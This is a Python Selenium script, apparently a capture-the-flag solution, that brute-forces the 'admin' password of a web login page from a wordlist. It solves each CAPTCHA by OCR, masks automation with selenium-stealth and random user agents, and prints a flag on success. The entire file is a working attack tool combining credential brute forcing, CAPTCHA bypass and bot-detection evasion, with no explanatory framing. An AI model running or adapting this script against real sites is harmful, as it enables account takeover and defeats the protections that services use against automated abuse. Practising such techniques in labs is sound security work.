from selenium.webdriver.common.by import By
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium_stealth import stealth

import time
from fake_useragent import UserAgent
from PIL import Image, ImageEnhance, ImageFilter
import io
import os
import pytesseract


options = Options()
ua = UserAgent()
userAgent = ua.random
options.add_argument('--no-sandbox')
options.add_argument('--headless')
options.add_argument("start-maximized")
options.add_argument(f'user-agent={userAgent}')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--disable-cache')
options.add_argument('--disable-gpu')

options.binary_location = "/usr/bin/google-chrome"
service = Service(executable_path='chromedriver-linux64/chromedriver')
chrome = webdriver.Chrome(service=service, options=options)

stealth(chrome,
    languages=["en-US", "en"],
    vendor="Google Inc.",
    platform="Win32",
    webgl_vendor="Intel Inc.",
    renderer="Intel Iris OpenGL Engine",
    fix_hairline=True,
)


# CONFIG
ip = 'http://10.10.112.50/'
login_url = f'{ip}/index.php'
dashboard_url = f"dashboard.php"
username = "admin"
wordlist = "wordlist.txt"

with open(wordlist, 'r', encoding='utf-8') as file:
    passwords = [line.strip() for line in file]


for password in passwords:
    print(f"[*] Trying password: {password}")
    while True:
        chrome.get(login_url)
        time.sleep(1)

        captcha_img_element = chrome.find_element(By.TAG_NAME, "img")
        captcha_png = captcha_img_element.screenshot_as_png

        image = Image.open(io.BytesIO(captcha_png)).convert("L")
        image = image.resize((image.width * 2, image.height * 2), Image.LANCZOS)
        image = image.filter(ImageFilter.SHARPEN)
        image = ImageEnhance.Contrast(image).enhance(2.0)
        image = image.point(lambda x: 0 if x < 140 else 255, '1')

        captcha_text = pytesseract.image_to_string(
            image,
            config='--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789'
        ).strip().replace(" ", "").replace("\n", "").upper()

        if not captcha_text.isalnum() or len(captcha_text) != 5:
            print(f"[!] OCR failed (got: '{captcha_text}'), retrying...")
            continue



        # Fill out and submit the form
        chrome.find_element(By.ID, "username").send_keys(username)
        chrome.find_element(By.ID, "password").send_keys(password)
        chrome.find_element(By.ID, "captcha_input").send_keys(captcha_text)

        chrome.find_element(By.ID, "login-btn").click()

        time.sleep(1)


        if dashboard_url in chrome.current_url:
            print(f"[+] Login successful with password: {password}")
            try:
                flag = chrome.find_element(By.TAG_NAME, "p").text
                print(f"[+] {flag}")
            except:
                print("[!] Logged in, but no flag found.")
            chrome.quit()
            exit()
        else:
            if "error" in chrome.current_url:
                print(f"[-] Failed login with: {password}")
                break  # try next password
            else:
                print(f"[-] Captcha failed: {password}")
                continue
chrome.quit()